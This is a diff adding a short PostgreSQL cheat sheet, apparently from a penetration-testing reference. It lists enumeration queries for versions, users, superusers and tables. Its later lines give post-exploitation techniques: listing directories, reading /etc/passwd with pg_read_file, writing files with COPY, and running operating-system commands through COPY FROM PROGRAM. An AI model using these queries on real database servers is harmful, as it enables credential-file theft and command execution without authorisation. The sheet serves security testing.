@@ -1,0 +1,30 @@
+---
+syntax: postgresql
+---
+-- Useful queries
+-- * get postgres version
+select version()
+-- * get current user name
+select current_user
+-- * get database users
+select usename from pg_user
+-- * get database superusers
+select usename from pg_user where usesuper is true
+-- * get current database
+select current_database()
+-- * get all databases
+select datname from pg_database
+-- * get all tables
+select table_name from information_schema.tables
+-- * list directory
+select pg_ls_dir('./')
+-- * read file
+select pg_read_file('/etc/passwd')
+-- * write file
+copy (select 'some content') to '/some/file'
+-- * execute command
+drop table if exists exec_cmd
+create table exec_cmd(out text)
+copy exec_cmd from program 'id'
+select * from exec_cmd
+drop table if exists exec_cmd
